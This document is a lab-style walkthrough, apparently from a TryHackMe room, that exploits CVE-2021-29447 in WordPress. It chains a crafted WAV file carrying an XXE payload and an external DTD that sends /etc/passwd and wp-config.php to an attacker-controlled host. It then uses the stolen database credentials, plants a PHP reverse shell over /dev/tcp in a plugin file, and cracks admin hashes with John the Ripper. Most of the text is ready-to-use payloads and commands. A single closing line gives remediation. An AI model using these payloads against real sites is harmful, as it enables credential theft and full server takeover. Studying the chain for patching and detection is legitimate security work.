# CVE-2021-29447 - WordPress Authenticated Arbitrary File Disclosure via Malicious WAV File

## Summary

**CVE-2021-29447** allows an **authenticated user with low privileges** to upload a **malicious WAV file** that triggers **remote arbitrary file disclosure** and **Server-Side Request Forgery (SSRF)**. In this write-up, weâ€™ll explore how to weaponize this vulnerability, retrieve sensitive WordPress configuration files, and eventually get a reverse shell.

---

## Step 1: Crafting the Malicious WAV File

You can manually craft a WAV file containing a malicious XML payload. Use the following command in your terminal:

```bash
nano poc.wav
```

Then write the content using this command:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://YOUR-IP:PORT/NAMEEVIL.dtd">%remote;%init;%trick;]>\x00' > payload.wav
```

---

## Step 2: Create the DTD Payload

On your attack machine, create `NAMEEVIL.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY %% trick SYSTEM 'http://YOUR-IP:PORT/?p=%%file;'>">
```

This DTD file will tell the server to include and base64 encode the content of `/etc/passwd`.

### Host a PHP Server

Make sure the DTD file is hosted on a reachable HTTP server:

```bash
php -S 0.0.0.0:PORT
```

> Replace `YOUR-IP` and `PORT` with your Kali or THM AttackBox IP and listening port.

---

## Step 3: Decode the Response

When the target server makes the request to your malicious DTD, it will send the base64-encoded contents of `/etc/passwd`.

Use this to decode it:

```php
<?php echo zlib_decode(base64_decode('PASTE_BASE64_HERE')); ?>
```

---

## Step 4: Target wp-config.php

Now modify your `NAMEEVIL.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY %% trick SYSTEM 'http://YOUR-IP:PORT/?p=%%file;'>">
```

Repeat the process and decode to extract database credentials:

```php
<?php echo zlib_decode(base64_decode('PASTE_BASE64_HERE')); ?>
```

---

## Step 5: Access the MySQL Database

Connect using credentials from `wp-config.php`:

```bash
mysql -h 10.10.1.7 -u thedarktangent -p --ssl=0
```

Once in, you can dump user data and get admin hashes for cracking.

---

## Step 6: Uploading a Reverse Shell

I found that the `hello.php` plugin was available.

Replace its contents with your PHP reverse shell payload.

Example: `reverse.php`

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR-IP/5555 0>&1'");
?>
```

### Upload Path

Upload the shell to:

```bash
http://VICTIM-IP/wp-content/plugins/hello.php
```

Then start a listener:

```bash
nc -lvnp 5555
```

You should receive a shell:

```bash
connect to [YOUR-IP] from (UNKNOWN) [10.10.1.7] 54384
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Step 7: Cracking WordPress Admin Hash

Use tools like `JohnTheRipper` to crack the hash obtained from the `wp_users` table.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Conclusion

This was an excellent example of chaining a low-privilege file upload vulnerability to SSRF and eventually full server compromise. Always sanitize user uploads and never allow XML entity resolution on sensitive systems.

**Happy Hacking!**

---

> Replace all `YOUR-IP`, `PORT`, and `VICTIM-IP` with your actual IP addresses when testing.
